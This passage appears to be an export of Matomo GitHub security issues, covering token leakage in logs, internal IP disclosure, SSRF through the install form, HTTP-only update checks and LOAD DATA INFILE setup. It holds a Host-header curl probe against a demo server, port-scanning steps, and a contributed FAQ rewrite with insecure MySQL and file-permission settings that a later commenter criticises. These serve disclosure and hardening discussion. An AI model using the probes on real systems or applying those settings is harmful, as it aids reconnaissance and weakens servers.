> 12.345.67.89 - - [31/Mar/2019:12:13:29 -0500] ""GET /matomo/piwik.php?idsite=1&rec=1&apiv=1&r=963767&cip=987.65.43.210&**token_auth=my_admin_token_auth**&_idts=1234094409&_idvc=0&_id=4a29e8bd0d739ec2&url=https%3A%2F%2Fwebsitename.com&urlref=&pv_id=714aa3&action_name=API+was+used HTTP/1.1"" 200 3312 ""-"" ""Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/70.0.3538.77 HeadlessChrome/70.0.3538.77 Safari/537.36""

According to [Tracking HTTP API](https://developer.matomo.org/api-reference/tracking-api):

> To track page views, events, visits, you have to send a HTTP request (GET or POST) to your Tracking HTTP API endpoint, for example, http://your-piwik-domain.example/piwik.php with the correct query parameters set.

However, it's not clear how to send these via POST when using [PiwikTracker](https://developer.matomo.org/api-reference/PHP-Piwik-Tracker) (instead of CURL). I haven't dug into Matomo's code but shouldn't the PiwikTracker be using POST so the token_auth doesn't show up? Is there a way to force PiwikTracker to use POST? Here's some basic scrubbed code I'm using:

```
<?php
require_once('/matomo/libs/PiwikTracker/PiwikTracker.php');

\PiwikTracker::$URL = 'https:' . BASE_URL . 'matomo';
$piwikTracker = new \PiwikTracker(1, 'https:' . BASE_URL . 'matomo');

$token = $this->getMatomoTokenAuth();

if (isset($matomo['force_new_visit']) && $matomo['force_new_visit'])
{ $piwikTracker->setForceNewVisit(); }

if (isset($matomo['visitorId']) && $matomo['visitorId'])
{ $piwikTracker->setVisitorId($matomo['visitorId']); }

if (isset($matomo['user-agent']) && $matomo['user-agent'])
{ $piwikTracker->setUserAgent($matomo['user-agent']); }

$piwikTracker->setTokenAuth($token);
$piwikTracker->setUrl($matomo['url']);
$piwikTracker->setUrlReferer($global['HTTP_REFERER']);
$piwikTracker->setIp($global['ip_address']);

if ($username) { $piwikTracker->setUserId($username); }

$piwikTracker->doTrackPageView(urldecode($matomo['page_title']));
$visitorID = $piwikTracker->getVisitorId();
```I suggest you create an issue in the Matomo PHP Tracker for this: https://github.com/matomo-org/matomo-php-tracker/
For the archiving there is https://github.com/matomo-org/matomo/issues/14190",no,"Major,Task,c: Security,"
matomo-org/matomo,1195843013,"exposing user name of the generator of a report sent by email in the ""replying-to:"" field of the email","Matomo reports sent by email are exposing the username of the user generating the report through the ""reply-to:"" header field of the email. Though it's not a big issue, exposing the username which also serves as login name for this user should be considered as low security risk. 

## Expected Behavior
The email header of the report sent by email should not contain the ""reply-to:"" field at all, but if it does or has to for some reason, it should be configurable similar to `noreply_email_address` for the ""from:"" header field.

## Current Behavior
Sending a report by email, Matomo adds the ""reply-to:"" header field, looking like this: 
`reply-to: username <emailaddress@mydomain.com>
`

## Possible Solution
As there is no need to reply to a report sent, this header field is not necessary anyway. The simplest solution would be to just not add this header field when sending reports at all.
Alternatively: add options similar to `noreply_email_address` and `noreply_email_name` to configure what name and email address to add as ""reply-to:"" header.

## Context
Temporary workaround: Don't send reports from the admin account, but choose a user with as-low-as-possible rights to send reports. This way, the username is still exposed, but security risk is lower than with the admin account.

## Your Environment
* Matomo Version: 4.8.0
* PHP Version: 7.3.33
","This issue has been mentioned on **Matomo forums**. There might be relevant details there:

https://forum.matomo.org/t/changing-the-email-address-name-reports-are-being-sent-from/45420/6
I believe that's a regression, maybe we should add to the next milestone since there is a low-security risk.  I would recommend if there is no-reply header set, we hide part of the username. Like `ma***d`@peterhashair can you point at the PR you think this is a regression from?That shouldn't be a regression. This code exists since 2017:
https://github.com/matomo-org/matomo/blob/821734c769fb012fc2ee5994b56937988150bc0f/plugins/ScheduledReports/ScheduledReports.php#L368-L378",no,"c: Security,c: Privacy,"
matomo-org/matomo,812309633,"Use password_hash directly instead of password_hash(md5())","As discussed in https://github.com/matomo-org/matomo/issues/11962#issuecomment-782231136

At the moment Matomo stores passwords as password_hash(md5($user_password)). While this isn't a huge issue, this also isn't ideal.

To avoid this one could create a migration that adds some version string to this hash and then modifies the code to allow logging in with this modified old hash. In addition a new method could be created that uses password_hash directory (with some other version string). 
Finally every time a user logs in, the password hash could be migrated from the old to the new method using the users password directly. (quite similar to the current setup with password_needs_rehash)",,no,"c: Security,"
matomo-org/matomo,41989511,"List all sessions I'm currently signed in Piwik and let me signout","The goal of this issue is to add a single place to see everywhere you’re signed in to Piwik and manage those sessions in your settings. 

Not sure if you remembered to log-out of your Piwik account on your friend’s computer? This feature will have you covered. You will be able to go to your settings and click on `See where you are logged in` to see a complete list of the devices that you are logged into. You also can manage these sessions from this new page. If you see a session that you want to turn off, simply click on the sign out link.

This feature is available in Gmail, Google, Linkedin, and growing number of popular online tools. It really helps improve security.
","In which version of piwik should expect this plugin?
It's set in our `Mid term` milestone which can be about 1-3 years. If you need this faster please contact Piwik consulting: http://piwik.org/consulting/ Cheers
I have a plugin called LoginRevokable located at https://github.com/torosian/LoginRevokable that accomplishes most of what your looking for. Rather than displaying a list of authenticated devices, it remotely logs you out of all devices when you log out of one of them. So, forget to log out of a friends computer? Just log out piwik on your computer when you get home, and your session at your friends is invalidated also.

I activated the webhook before pushing tag 0.1.1, so it should be in the marketplace shortly.
It is now in the marketplace at http://plugins.piwik.org/LoginRevokable
Hi @torosian that's nice to see your plugin on the Marketplace! 
I haven't tested the plugin, but left a couple feedback in your issue tracker. 
",no,"Enhancement,c: Security,"
matomo-org/matomo,274183453,"Internal IP Exposure","This is in the latest version of Piwik 3.2.0

If you head to the HTTPS address, using the direct IP, and get the warning message about an untrusted hostname, then view the source of that page, the listing for piwik.piwik_url is the INTERNAL IP and not the EXTERNAL that you used to get there.  This should be fixed, it’s a low risk, but the internal should never be exposed to the general public. The only work around we have right now is to disable this feature using enable_trusted_host_check=0  Viewing the source with it disabled, displays the correct external IP.
","Haven't had a closer look, but afaik it should output `$_SERVER['HTTP_HOST']` Report today:

Matomo discloses the server's internal IP address via the 'Location' header if you access /index.php/ with a non-default host header

For example:
curl -v -H 'Host: demo.matomo.org:123' https://demo.matomo.org/index.php/
...
< HTTP/1.1 302 Found
< Location: https://127.0.235.163/index.php

Internal IP disclosure poses no real risk on its own, but it makes exploiting other vulnerabilities like SSRF quite a lot easier. I do not expect a bounty for this.

",no,"c: Security,"
matomo-org/matomo,88863609,"sanitize tracking code displayed in the UI on output, not input","In TrackingCodeGenerator::generate(), `htmlentities()` is used (improperly) to escape HTML characters. The result is then outputted w/o escaping in _displayJavascriptCode.twig. Instead, TrackingCodeGenerator should return JS code w/o any additional processing/escaping, and it should be escaped only in HTML/XML output.

This is BC breaking since it affects API output. Users of that API currently will have to unsanitize or display the text w/o escaping, so it may break uses.

Refs #4231, #8109
","> This is BC breaking since it affects API output. User of that API currently will have to unsanitize or display the text w/o escaping, so it may break uses.

I'm not quite sure I understand. What exactly will break? Meaning what is the output before and after? Will people still be able to fetch the tracking code from the API and insert it automatically into the website? As it is 3.0.0 it is probably less important re BC but asking as there is already one issue merged. Hope we're not breaking API before :)
Right now, TrackingCodeGenerator will return already escaped output, which means SitesManager.getJavascriptTag will return escaped output, even if the format is JSON. After this issue is closed SitesManager.getJavascriptTag should return unescaped output for JSON results. If users are expecting escaped output, then their code may break.

There is no related BC break in 2.14.
Goals:
- Remove `|raw` filters
- First PR was created and needs to be reviewed:  #7997
",no,"c: Security,c: Platform,"
matomo-org/matomo,44433129,"New config setting to set autocomplete=off to password fields in Piwik","The goal of this issue is to create a new config file setting to enable `autocomplete=off` on all password fields in Piwik. 

Steps
- New config setting
- Applies to Login form, Password reset form, and other password field in Manage users admin screen 

Reasoning behind the request:

In february this year someone made the suggestion  in PR #231 and I decided to not put it in Piwik core as there seems to be a lot of people arguing against this measure as it breaks the usability of password managers. For more info on the pros/cons see: https://startpage.com/do/search?q=autocomplete%3Doff%20security 

However because some users like this setting and because it does provide better security in some cases  such as a Piwik accessible to dozens of people, then we should simply add such a useful setting.
","Is there any update on this features addition? That isn't anything we will work on soon. But Pull Requests are always welcome 🙂 Our security folks think we need to  set autocomplete=off. Currently we have to modify the matomo-installation after each update manually. We would really appreciate a config-setting for this.Hoenestly this doesn't matter anymore. Website developers have abused autocomplete=""off"" to break password managers so that most browsers started to side with the users and are ignoring it now. ",no,"Enhancement,c: Security,"
matomo-org/matomo,960088828,"Add .md files in the .htaccess file","## Summary
Some user ask:
```
To increase security and prevent from prying eyes I am deleting CHANGELOG.md once Matomo updates have been completed.
Why does Matomo run a File integrity check on CHANGELOG.md?
Why does Matomo need those *md files which easily reveal which Matomo version I am running?
```
I suggest to add *.md files or at least the `/CHANGELOG.md` file in the .htaccess file in order to increase (very little) the security...

## Your Environment
Ticket created from the forum: https://forum.matomo.org/t/why-does-matomo-run-a-file-integrity-check-on-changelog-md/42725","@heurteph-ei Thanks for picking up my question.Hi there. Thanks for your suggestion. Guess in general access to that file is not needed. So if possible you could simply restrict that server side. Matomo actually doesn't need that file to run, but afaik all files included in the release are included in the File Integrity check.Thanks. For now I am Redirecting requests using.

`RedirectMatch 404 \.md$`refs https://github.com/matomo-org/matomo-package/pull/126#issuecomment-807284191

Generally, if someone doesn't want such files accessible you can indeed redirect them or block access to it. ",no,"Enhancement,c: Security,"
matomo-org/matomo,216221725,"Installation user guide: improve security guidelines","### Suggestions below reported by email


Let me prefix this by saying that I have never installed your product.  In large part because of the issues below.
I am basing these security flaws on the current documentation on https://piwik.org/docs/installation/

1. Configuration is world-writable.

   As per the image in:
   https://piwik.org/wp-content/uploads/2008/11/2b-check-tofix1.png

   The configuration is created world-writable during the installation procedure.
   Either this is done by the software (unverified), or by the user following the instruction shown.

2. MySQL credentials are transmitted over unencrypted HTTP.

   There is no mention in the installation instructions of using encryption to safeguard credentials.
   There is no alternative method documented to configure the credentials (e.g. editing the configuration and uploading via scp).

3. Superuser credentials are transmitted over unencrypted HTTP.

   There is no mention of safeguarding these credentials either.

4. The phrase, ""by default the super user will be signed up for upgrade and security alerts"";

   There is no information about the privacy policy.
   There is also no mention of whether (or how, or which) user information will be submitted to Piwik when the option is not selected.

Thanks.",,no,"c: Security,"
matomo-org/matomo,140545084,"Enable MySQL Strict mode as best practise and security improvement","The goal of this issue is to enable MySQL strict mode in Piwik.
### Why enabling Strict mode?
- MySQL strict mode is a setting that implements a best practise around data management
- MySQL strict mode results in better security for Piwik users. Why? Currently as we are not using Strict mode, sometimes values with special unicode characters could be automatically truncated before being inserted. Why is data truncation a possible security issue? when values are truncated before being inserted in the DB, this can open up the application to certain vulnerabilities such as XSS, under special circumstances. For example see [this XSS in Wordpress](https://cedricvb.be/post/wordpress-stored-xss-vulnerability-4-1-2/)  (`tldr; mysql → special characters → truncation → input validation → output sanitisation → xss → time to update WordPress.`)

We would like to bring the best security practises to Piwik and strict mode would be a valuable security improvement.
### Requirements
- Currently, some plugin's dimensions (database table columns) are not NULLAble. Therefore when inserting a tracking request and if one of these not NULLable dimensions does not have a value, the INSERT in MySQL would fail in strict mode, causing data loss.
  - When we previously added `STRICT_TRANS_TABLES` in Piwik, this data loss made us revert the change. Reported in https://github.com/piwik/piwik/issues/8853 and fixed in https://github.com/piwik/piwik/pull/8930/files
- To prevent any data loss in Strict Mode, we need to modify all tracker dimensions in core and in all plugins (`log_*.*` columns) to be NULLable. Covered in #9231 (Make all log_\* tables fields NULLable to prevent errors ""Field 'X' doesn't have a default value""). 
  - Maybe we could also preset the dimension's value to non NULL value, when a dimension's value is not defined, to prevent strict mode from issuing a warning and discarding the INSERT?
- To make sure any data loss or warning during tracker is reported to Piwik users/admins, we need a stronger error reporting mechanism to communicate such issues automatically to Piwik administrators. Covered in  #7550 (How to detect any failure during Tracker requests and pro-actively inform Piwik admin of such error)

(also refs Require Mysql 5.5 #9107 and making utf8mb4 the collation by default #9785)
","+1",no,"c: Security,"
matomo-org/matomo,1299897071,"Allow moving all files apart from assets out of web root","this is a bit of a continuation of #8120

At the moment, Matomo can only be used by settings the web root to the directory all Matomo files are in. This means additional web server configuration and precisely crafted rules are required so that security-relevant files (especially tmp/ and config/) are not publicly accessible. But as web server configurations vary widely and as the recent ""private directories"" system check shows, there are a lot of people for who these configurations don't work (most commonly because `AllowOverride` is disabled (#17819) and therefore the .htaccess files created by Matomo do nothing). And the system check that tries to access the URLs that should be private makes some people aware of this, but often confuses people (#18693) or creates new issues (#18182, #17589, #18967, #19149) either because the failing requests trigger things like fail2ban or because it exposes broken cacert-setups.
And that is completely ignoring the question of people who don't use apache and then have to find out themselves that they need to block some file requests or their Matomo setup is insecure.

To get to the point: I feel like offering a Matomo install which works similar to this (and how most modern PHP/laravel applications work) would solve a lot of complexity which gaining a lot of security:
- Matomo would have a public/ directory
- People could use Matomo by setting their webroot to this directory
- public/index.php would be a simple script that imports the main index.php and probably fixes some path
- and probably a config.ini.php option that would enable this mode (as otherwise ""default"" users would have duplicate URLs)
- JS/CSS assets would work out of the box as they use index.php
- other assets would need to be copied to a corresponding subpath in public/ either implicitly (""copy some directory in every plugin"") or explicitly (""allow specifying a list of files that need to be public in the plugin description"")
- While I don't think large changes are needed, these changes still feel breaking enough for me that this would need to be part of Matomo 5

Also this would be an optional feature as there are still people who don't know what a web root is (even though a lot of PHP FOSS applications don't offer any other way to be used).

In summary, I think this would make it a lot harder for people to accidentally shoot themselves into the foot in regard to security (it's not like I haven't noticed in the past that I had some important Matomo files accidentally public), but it also has the disadvantage of offering ""one more way"" to install Matomo.
",,no,"Enhancement,c: Security,"
matomo-org/matomo,637436818,"how to make matomo.js tracker file not writable by the web server user for better security","Currently we recommend to make the matomo.js tracker file writable by the web server user, otherwise we display a warning in ""Diagnostics"": 

> The Matomo JavaScript tracker file ""/matomo.js"" & ""/piwik.js"" is not writable which means other plugins cannot extend the JavaScript tracker. In the future even some core features might not work as expected. We recommend to make ""/matomo.js"" & ""/piwik.js"" writable by running this command: 

As reported in https://github.com/matomo-org/matomo-package/issues/109 having core Matomo files as read-only would be a plus for security for some users. In particular, when the same server hosts other apps and one of these other apps gets attacked, then at least the attacker wouldn't be able to serve malicious JS via Matomo.

It can actually already be implemented by following these steps:
* make the file non writable by the webserver user (which will trigger the warning in diagnostics)
* but make the file writable by the crontab user
* setup a crontab to run every hour that will execute the command: `php path/to/matomo console custom-matomo-js:update` <- this crontab will re-generate the matomo.js tracker file when needed (for example after upgrading plugins that define a JS tracker file, or after installing a new plugin that has a tracker js file).

So maybe what we could do to eventually ""solve"" this issue would be to:
* Document this possible security enhancement in a FAQ and maybe mention it in https://matomo.org/docs/security/
* Update the logic in the diagnostic and do not issue a Warning, when the tracker JS file is not writable but was recently modified (eg. less than 2 hours ago) which would indicate that the steps above were implemented?
",,no,"c: Security,"
matomo-org/matomo,356164841,"Keep track of recognized user agents for more security","This feature would be akin to what facebook does.

* Matomo would keep track of logged in IPs & user agents.
* When a new, unknown IP/user agent logs in when there is another existing session, the existing session must approve the new device.
* In the admin area a user should be able to see the list of recognized devices and their last logins/login attempts.

This could also tie into a two factor auth feature, if a new device is used and there is no existing session, could require doing two factor auth for that login as an extra step.",,no,"c: Security,"
matomo-org/matomo,398729112,"ask Super Users to re-validate their email addresses if they attempt to sign in for the first time after a long break","To ensure Super Users are really the people they claim to be, when a Super User attempts to sign in for the first time after a long break (eg. one year?) then we ask the Super User to re-validate their email address by clicking on a link.

Idea from twitter: https://twitter.com/simonw/status/1084601178954944512

![sec](https://user-images.githubusercontent.com/466765/51094229-042b4a00-1810-11e9-96f8-ca6db778fc53.png)

","I could pick up and prepare PR for that issue. 

I was thinking about make two new settings in .ini config: boolean  `revalidate_superusers_password` to toggle the feature (default to `1`) and integer `revalidate_superusers_password_after` with default set to `365`. 

I see that there is already `last_seen` option that can be used for that but what about users that don't have `last_seen`? I see that could happen in two situations:
- if somebody never logged in: then we should look at registration time and re-validate e-mail address if it was `>= revalidate_superusers_password_after`.
- if someone updated Matomo from version that did not have `last_seen` saved: do you maybe know how long ago it was added? is is something I should worry about? if so, what to do?

What do you think about that approach?Wonder if we even need a setting or could just revalidate after 1 year or 6 months or so?Something to keep in mind though that makes this flow a bit buggy is that we don't validate an email address when adding an account. So the super user email may not actually exist and can therefore not be validated afterwards. It should be edge case though and we could just have an FAQ explaining how t o change the email address or so in the DB.",no,"c: Security,"
matomo-org/matomo,611600645,"Build UI for IP Whitelisting feature","It would be a security improvement if we could get our IP whitelisting feature configurable from the UI: https://matomo.org/faq/how-to/faq_25543/

To prevent people locking themselves out, we would maybe warn them if they're about to add an IP to the list that doesn't include their own IP address?",,no,"c: Security,c: Usability,"
matomo-org/matomo,308860387,"During installation, try to automatically force HTTPS, or invite users to setup SSL via Let's encrypt","The goal of this issue is to make sure most users will use Matomo over SSL all the time. Using SSL is very important and we need to remind users they should have it enabled by default.

### Context

 These days It is basically required to run Matomo over SSL for anyone using Matomo seriously. This will also help users achieve GDPR compliance #12600 as it's essential to use HTTPS for Matomo and GDPR compliance.

We are doing some work also in other issues:
* New system check to  #7279 Warn users if force_ssl is not yet enabled and in 
* #7366  Tracking code could use HTTPS when the Piwik server is configured to force SSL connections 

### Solution

Here the proposed solution is that during installation (maybe even in the very first screen?) we would display a new checkbox ""[x] Use HTTPS for secure data transfer with Matomo"" 

* if user is already using HTTPS, then auto-tick the box
* if user is using HTTP, we could maybe check and issue an HTTPS connection to check the index.php or the API replies correctly. If the HTTPS response is good, then we could also auto-tick the box.
* if the HTTPS check didn't pass, we could display a message ""Warning: please configure your Matomo instance so that connections succeed over HTTPS at https://example.com/ \n In case you do not yet ""
have a SSL certificate for your domain, we recommend to use (or ask your technical team) [Let's encrypt](https://letsencrypt.org/) to generate free SSL certificates"".

initially suggested by @sgiehl in https://github.com/matomo-org/matomo/issues/7279#issuecomment-75618484
",,no,"c: Security,c: Privacy,"
matomo-org/matomo,1257528620,"Move Annotations into their own dedicated table","### Move Annotations into their own table

At the moment annotations are saved in the `Option` table into a single row per site (see  `\Piwik\Plugins\Annotations\AnnotationList::save`). This approach seems to cause DB performance problems when annotations are added in bulk due to constant serialization and locks for updating on a single row.

An approach to cleanly solve this problem would be to create a dedicated DB table for the annotations rather than the single row serialization. This would require a new model/schema and a migration of the current data, but would be a good way to future proof and solve this performance problem.

## Your Environment
* Matomo Version: 4.10.1
* PHP Version: 8
* Server Operating System: Mac
* Additionally installed plugins:
","I will move this to the For Prioritization queue. It is a pretty important issue to keep Cloud performant also.Would it be possible to add it as a report in itself too? So that we could export it afterwards? For example as an email report.@Chardonneaur In theory the would be possible. For that we need API methods to fetch those annotations and a report class to provide that. But not sure if that will be handled in this issue.",no,"Major,Enhancement,c: Security,"
matomo-org/matomo,195683370,"Inconsistent use of cryptography - always try SSL first to connect to Piwik.org and other services","During security testing 3.0.0-rc3 I noted the following inconsistencies in the use of TLS that means someone with access to network traffic from client to servers (Piwik server or *.piwik.org) or from server to Internet could manipulate the content of pages within Piwik or executable modules, or exec within Piwik even if the end server uses TLS to protect all its page views.

1. Download link for 3.0.0-rc2 on Piwik blog https://piwik.org/blog/2016/12/piwik-3-release-candidate/ uses HTTP not HTTPS when linking to builds.piwik.org

Mitigate this by migrating the servers to HTTPS and use HSTS to keep users using HTTPS even if they encounter an HTTPS link, including builds.piwik.org.

Although all builds are PGP signed, you wouldn't known this unless you specifically go looking for that information, when you are directed to http://piwik.org/blog/2014/11/verify-signatures-piwik-packages/ this could also mitigate or defeat people attempting to impersonate the builds.piwik.org server.

2. Help information within in the app links to the Piwik site using HTTP when HTTPS is available. 

Mitigation - use HTTPS for these links.

Use of HSTS might reduce the window for attack without needing to change all links.

Some of this information also goes via the Proxy, but still opens pages over HTTP.

3. Feed burner information is loaded from

http://feeds.feedburner.com/Piwik

by the server to populate the Piwik Blog box by default.

plugins/RssWidget/Widgets/RssChangelog.php:            $rss = new RssRenderer('http://feeds.feedburner.com/PiwikReleases');
plugins/RssWidget/Widgets/RssPiwik.php:            $rss = new RssRenderer('http://feeds.feedburner.com/Piwik');

The HTTPS version of feedburner URLs are available, although there is some mixed content due to innocraft images loading over HTTP, these images aren't rendered in the RSS summary.

There doesn't appear to be any attempt to sanitise content in the RssRenderer, if the content could be relied on to be from a trusted source the current sanitisation may be sufficient, I didn't try manipulating or replacing feedburner responses, it can at least be exploited to lead users to the wrong website.

Testing of server HTTP use was incomplete, as we didn't start recording server HTTP activity before the installation was started. We noted other server initiated traffic over HTTP, but weren't able to confirm that Piwik was the source.","Noted in testing 3.0.4 that the request below still travels over HTTP, it also leaks pretty much everything (MYSQL version, PHP version, client IP address, timezone, server URL), and could be manipulated by attacker between server and Piwik server to prevent upgrades being applied, as well as identifying vulnerable servers.

I appreciate server to server HTTPS can be frustrating as many servers have such poor TLS settings out of the box (which is why WordPress does it itself, which isn't ideal either).

GET /1.0/getLatestVersion/?piwik_version=3.0.4&php_version=7.0.16&mysql_version=5.5.54&release_channel=latest_stable&url=http%3A%2F%2F10.66.2.85%2Findex.php&trigger=CoreHome&timezone=Europe%2FLondon HTTP/1.1
Host: api.piwik.org
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: */*
X-Forwarded-For: 10.67.255.98
Via: 3.0.4  (Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0) Gecko/20100101 Firefox/53.0)
",no,"c: Website matomo.org,c: Security,"
matomo-org/matomo,624636804,"SSRF at DB setup due to lack of input validation","This issue corresponds to https://hackerone.com/reports/881345 by me.

**Description**
Matomo application while installation asks to create database setup which is handled by file at line https://github.com/matomo-org/matomo/blob/4afbe93a40334d31f2e0a71867277d183938f7a5/plugins/Installation/FormDatabaseSetup.php#L122 , which takes host as input from user. Host parameter has no input validation so instead of supplying a URI, attacker inserted a socket IP:Port. If the port is open, it will create a session.

Steps to Reproduce

1.  Download the matomo application from github and start the instalation.
2.  At Database setup page, insert IP:$port eg - 127.0.0.1:8080

For open ports, a connection will be established and for closed it will say connection refused. Please check the screenshot.

It is suggested to validate user input or create a separate field for port if it is meant to be a functionality.

**Impact**

If a person is authorized to install and maintain Matomo remotely and does not have access of the server on which Matomo is being installed, then an attacker can successfully do an internal port scan of the network and interact with other services running on other ports.
","In what way is this different to Wordpress, Nextcloud, Mediawiki, Moodle, etc. that all allow you to specify the MySQL host during the setup?

Can you also expand on how you would want to validate the user input? Any port and hostname could be a valid one (as one can install MySQL on any port), so any input by the user is valid.Hi @Findus23 
I am not aware of any other products mentioned, never worked on them, can't say about them.

Validation:
The page that allows user to set up database has a field **Host** which ideally should take host not a socket as I provided, to do so a regex pattern can be used for this field or Input character policies should be used and additionally a field **Port** can also be added, similar technique was used in CVE-2017-7272.
To perform a successful attack, I sent multiple requests to check the the open and closed ports --> adding rate limiting is also a good idea.
> 
> 
> In what way is this different to Wordpress, Nextcloud, Mediawiki, Moodle, etc. that all allow you to specify the MySQL host during the setup?
> 
> Can you also expand on how you would want to validate the user input? Any port and hostname could be a valid one (as one can install MySQL on any port), so any input by the user is valid.

Please look into it
",no,"c: Security,Waiting for user feedback,"
matomo-org/matomo,63897572,"LOAD DATA INFILE: Security issues in documentation and in general","I found some issues in the FAQ, which somehow disable security features to get MySQL's LOAD DATA INFILE to work:

```
Check that the sql user that Piwik is using has the permission to import the files: GRANT FILE on *.* to piwik@localhost
```

It should be

```
db.*
```

or even better

```
db.temptable
```

and not

```
*.* 
```

which would affect all databases (not only the piwik database).

```
give the process mysqld executable-access (+x) to files in path/to/piwik/tmp/assets/* and all parent folders.
```

Why would mysqld need to execute files in tmp/assets? Instead, read access to files should do, execution is only needed for directories.

```
check that the request isn’t blocked by apparmor or any other security-software when accessing this folder. If you are using Ubuntu, you may have to disable apparmor which prevents mysql from accessing files in path/to/piwik/tmp/*
Edit the file /etc/apparmor.d/usr.sbin.mysqld and add the following path in the file: /path/to/piwik/tmp/assets/* rw,
Then restart apparmor with sudo /etc/init.d/apparmor restart
in your Mysql configuration (my.cnf) set the following options: [mysqld] local-infile and [mysql] local-infile
Then restart Mysql.
```

The local-infile would be system-wide, not only piwik-specific. In general, this opens up mysql. Plus, disabling apparmor is not an option for many users. Plus, why is writeable access proposed for mysqld (rw)?

```
If the LOAD DATA INFILE is still not working, try the following:
update to the latest PHP version or use the mysqli client (there are some known bugs with older PDO clients for mysql)
and/or switch the client to adapter=MYSQLI in the config/config.ini.php
and/or disable in your php configuration php.ini the options open_basedir and safe_mode. Restart webserver.
```

Switching to MYSQLI is not an option for everyone. Playing around with open_basedir and safe_mode does not have something to do with PDO/MYSQLI as the reader might assume when reading the text. Plus, open_basedir and safe_mode are important security features which should NOT be disabled just to fix some errors. Users should be taught about that. Plus: What does file read access in the context of mysql have to do with PHP's open_basedir/safe_mode settings? These settings will only affect how apache/PHP process behaves. MySQL is a separate process which will not respect these settings at all!

```
If you still cannot make LOAD DATA INFILE work, you can disable this feature completely. This is not recommended for medium to high traffic Piwik where this feature should be enabled. To disable LOAD DATA INFILE add to your config.ini.php file under [General] section: enable_load_data_infile=0
```

Yes, that's the best option for most users who would otherwise insecure their servers.

Documentation needs to be reviewed in terms of security (I just red the part I was writing about). Unexperienced users will insecure their systems otherwise.

And for the code: In general, I would suggest to not use LOAD DATA INFILE in the context of mysqld at all. For PostgreSQL there exists a set of PDO-functions allowing bulk inserts in the context of the PHP-client via file or STDIN. Check out https://bugs.php.net/bug.php?id=63656 . Eventually, there is also an option for MySQL, but I did not search for that right now. That's the way to go: No file access via the database process -> no hassle. And it's fast as hell on PostgreSQL, still allowing transactions by reusing the context of client's connection. I even found a way to reuse doctrine connections for that on PostgreSQL. If you are interested in that, read my comment on the mentioned php.net site (I feel sorry that you used MySQL...).

For users who don't use BULK INSERTs, please check out if a MySQL transaction is used around the whole dataset which is to be inserted. Plus, check out if the MySQL Multi Row syntax insert is used. Both measurements could massively improve performance.

If inserts are done via ORM (doctrine, etc.), please make sure that you use MySQL transactions (doctrine supports that) around the mass INSERTs. Within the transaction, you can flush multiple times using flush(array). Make sure you destroy objects between flushes, and make sure that only few entity objects are instantiated at any time. Having lots of objects instantiated heavily slows down doctrine performance.
","Hi @thomaszbz Thanks for the suggestion to improve the documentation about this feature.

since you seem knowledgeable about the security implications, maybe you would be able to paste here your suggested updated text for this FAQ? it would help us make this change faster. cheers 
As @thomaszbz explain on https://issues.piwik.org/7519 and @mattab commented about improving the documentation these where the steps I did on my Piwik installation just in case someone of you want to update https://piwik.org/faq/troubleshooting/#faq_194: 
-------------------
 How do I get LOAD DATA INFILE to work on my server?

Piwik processes huge amount of data and then stores this data in the database. For improved performance, Piwik tries to import a lot of data in the database at once using a Mysql feature called “LOAD DATA INFILE”. You can check whether your server supports this performance improvement in Administration > System Check menu. The system checks two commands: LOAD DATA INFILE and LOAD DATA LOCAL INFILE. It’s enough if either one of these work.

In order to do this, connect to your webserver with SSH. You'll need ROOT ACCESS OR ROOT PERMISSIONS.

    ssh root@your_webserver.com

First check that the sql user that Piwik is using has the permission to import the files: 

	mysql -u root -p 
	GRANT FILE on your_db_name.* to piwik@localhost;
	exit

Check the “mysqld” process can access the file created in the tmp/assets directory in the piwik-installation: give the process mysqld read-access to files in path/to/piwik/tmp/assets/* and all parent folders.

	path/to/piwik/tmp/# chmod -R 755 assets/

check that the request isn’t blocked by apparmor or any other security-software when accessing this folder. If you are using Ubuntu, you may have to disable apparmor which prevents mysql from accessing files in path/to/piwik/tmp/* Edit the file /etc/apparmor.d/usr.sbin.mysqld and add the following path in the file: 

	vim /etc/apparmor.d/usr.sbin.mysqld

		# Allow piwik access tmp files
		  path/to/piwik/tmp/assets/* rw,

Restart apparmor:

	sudo /etc/init.d/apparmor restart

in your Mysql configuration (my.cnf) set the following options: [mysqld] local-infile, secure-file-priv = """" and [mysql] local-infile

	vim /etc/mysql/my.cnf
		
		[mysqld]
		local-infile=1
		secure-file-priv = """"
		[mysql]
		local-infile=1

Restart mysql: 

	sudo service mysql restart

Now you can have that nice ""Huzzah! There are no problems with your Piwik setup. Give yourself a pat on the back."" message on Piwik's System Check page.  
@fortinux Nice catch. It's just that ordinary web space hosters won't let anyone change an apparmor profile. Now that the documentation already suggests to do exactly that, it should be documented that this step requires root access.Hi,

I just started out using Matomo and you should really rework this mentioned section in the help.
I am sorry to say, this is not offending, but it is as insecure and wrong as it could get.
You propose to set the FILE grant for the db user and then in the same section you propose to set the directory permissions and set local-infile. This absolutely makes no sense at all, either you use LOAD DATA INFILE : Then you need to grant a FILE permission to the user and make the directory accessible somehow, this is true. But then you don't need local_infile option at all. For what?
Or you use local_infile, then you absolutely don't need the other steps, no FILE grant and no directory permissions for mysqld process as LOAD DATA LOCAL does exactly not need that because it is read by the ""client"" which has access anyways and is ""uploaded"" to the server. I put this in """" because this also works if you are just working on localhost.
But as load_infile works only as a global setting like @thomaszbz mentioned this completely opens up your whole mysql install.
Users have a lot of problems to get LOAD DATA to work properly, but this is for sure not the optimal way. Most of them give up and just enable LOCAL, many without knowing the risks.
They should use either one of it not open up everything.
@thomaszbz sadly your suggestion to grant file on db.* makes no sense because this is even not possible. FILE is a global privilege and cannot be used on db level. You give the user all access for the server. That's it. If you have to use LOAD DATA you have to choose to open up directories that might be closed otherwise for 'mysql' user or use insecure LOAD DATA LOCAL.
This is not the best way to get it, especially for users that might have their install in /home/... directories, which is the case for many that use webpanel software. Won't get deeper into it in a public thread. 
But there would be really easy and far more secure ways to handle that. Really easy. Please consider that.

EDIT : 
as you can see in a previous comment @fortinux did exact that. He opened up both LOAD DATA possibility and then on top activated LOAD DATA LOCAL which makes the first things complete obsolete. This is not goodNothing seems to have happend for a very long time. What is the status here?",no,"Task,c: Security,"
matomo-org/matomo,394800919,"Homograph attack","Hello Kraken, I have found another interesting bug in the API key's list.

Bug:  Homograph attack.

Description: Please refer https://en.wikipedia.org/wiki/Internationalized_domain_name to know more about IDNs.
